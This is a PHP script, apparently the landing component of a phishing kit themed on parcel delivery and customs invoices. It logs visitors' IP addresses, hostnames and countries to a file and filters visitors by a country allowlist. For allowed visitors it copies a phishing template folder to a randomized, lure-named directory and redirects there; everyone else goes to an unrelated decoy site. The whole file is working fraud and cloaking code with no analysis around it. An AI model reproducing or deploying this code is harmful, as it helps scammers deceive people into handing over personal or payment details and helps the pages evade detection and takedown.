<?php
error_reporting(0);

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
date_default_timezone_set('GMT');
$time = date("d-m-Y H:i:s");
$userAgent = getenv("HTTP_USER_AGENT");



$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$country = $J7->geoplugin_countryName;
$EKO = $J7->geoplugin_countryCode;
$file = fopen("visit.txt", "a");
fwrite($file, $ip . "         [TIM]" . $time . "        [CNT]" . $country . "            [HOST]" . $hostname . "\n"); 





include '../database.php';
if(!in_array($EKO,$allowlist)){
    
///------------------------------------------------------------------------------------///
	
$ti = substr($TIME, 0, 10);
$ma = "parcel-General-delivery_reefeerence_commande_VSH160364321396_20210201"; //
$da = "222222222222";
$zab = $da . "-";
$zabi = $ma . "viewinvoice-commissioning-customs-virtual_tw"; //
$rnd = md5(uniqid(rand(0, 13))); # <------ PUT YOUR NUMBER HERE
$ZOKOK = $zabi . "-id_url.html=" . $rnd; //
$random = rand(0, 100000) . $_SERVER['REMOTE_ADDR'];
$dst = substr($ZOKOK, 0, 400);
function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    $result = ($dir === false ? false : true);
    if ($result !== false)
    {
        $result = @mkdir($dst);
        if ($result === true)
        {
            while (false !== ($file = readdir($dir)))
            {
                if (($file != '.') && ($file != '..') && $result)
                {
                    if (is_dir($src . '/' . $file))
                    {
                        $result = recurse_copy($src . '/' . $file, $dst . '/' . $file);
                    }
                    else
                    {
                        $result = copy($src . '/' . $file, $dst . '/' . $file);
                    }
                }
            }
            closedir($dir);
        }
    }
    return $result;
}
$src = "KAMIHAMIHA";
recurse_copy($src, $dst);
header("location:" . $dst . "");
	
///------------------------------------------------------------------------------------///
	
}


    die(" <meta http-equiv='refresh' content='0; url=http://2m.ma/'>" );



exit;

